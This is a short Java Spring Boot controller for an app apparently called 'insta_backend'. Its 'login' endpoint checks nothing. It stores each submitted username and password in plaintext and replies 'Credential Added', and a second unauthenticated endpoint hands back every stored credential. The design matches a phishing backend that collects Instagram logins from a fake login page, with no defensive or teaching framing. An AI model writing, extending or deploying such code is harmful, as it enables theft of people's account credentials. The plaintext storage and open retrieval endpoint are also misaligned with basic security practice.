package com.example.insta_backend.resource;

import com.example.insta_backend.repository.InstaRepository;
import com.example.insta_backend.util.Credentials;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RestController
public class InstaController {

    @Autowired
    InstaRepository instaRepository;

    @PostMapping("/api/login")
    public ResponseEntity<Map<String, String>> login(@RequestParam String username, @RequestParam String password) {
        Credentials entity = new Credentials(username, password);
        instaRepository.save(entity);
        Map<String, String> response = new HashMap<>();
        response.put("message", "Credential Added");
        return ResponseEntity.ok(response);
    }

    @GetMapping("/api/getcredentials")
    public ResponseEntity<Map<String, List<Credentials>>> getCredentials() {
        List<Credentials> credentialsList = instaRepository.findAll();

        // Wrap the list in a Map with "categories" as the key
        Map<String, List<Credentials>> response = new HashMap<>();
        response.put("credentials", credentialsList);

        return ResponseEntity.ok(response);
    }

}
